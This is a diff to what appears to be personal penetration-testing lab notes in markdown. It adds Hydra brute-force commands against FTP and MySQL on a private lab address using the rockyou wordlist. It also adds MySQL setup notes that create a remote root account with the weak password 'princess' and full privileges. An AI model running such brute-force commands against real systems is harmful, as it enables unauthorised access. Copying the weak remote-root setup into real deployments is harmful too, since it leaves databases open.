@@ -593,7 +593,15 @@ hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt 192.168.6.128 SS
 ```
 
 ## FTP bruteforce
+```
 hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt 192.168.6.128 FTP
+```
+
+## MYSQL bruteforce
+```
+hydra -t 1 -V -f -I -l poly -P /usr/share/wordlists/rockyou.txt 192.168.6.128 MYSQL
+```
+
 
 ## Web directory bruteforce
 dirbuster -u http://192.168.6.128:8443
@@ -710,6 +718,21 @@ vi /etc/mysql/mysql.conf.d/mysqld.cnf
 
 ```
 sudo service mysql restart
+```
+
+## Permissions
+```
+sudo mysql -u root
+
+flush privileges;
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'new_password';
+
+mysql> CREATE USER 'root'@'192.168.6.130' IDENTIFIED BY 'princess';
+Query OK, 0 rows affected (0.04 sec)
+
+mysql> GRANT ALL PRIVILEGES ON database_name.* TO 'root'@'192.168.6.130';
+Query OK, 0 rows affected (0.00 sec)
+
 ```
 
 <!---
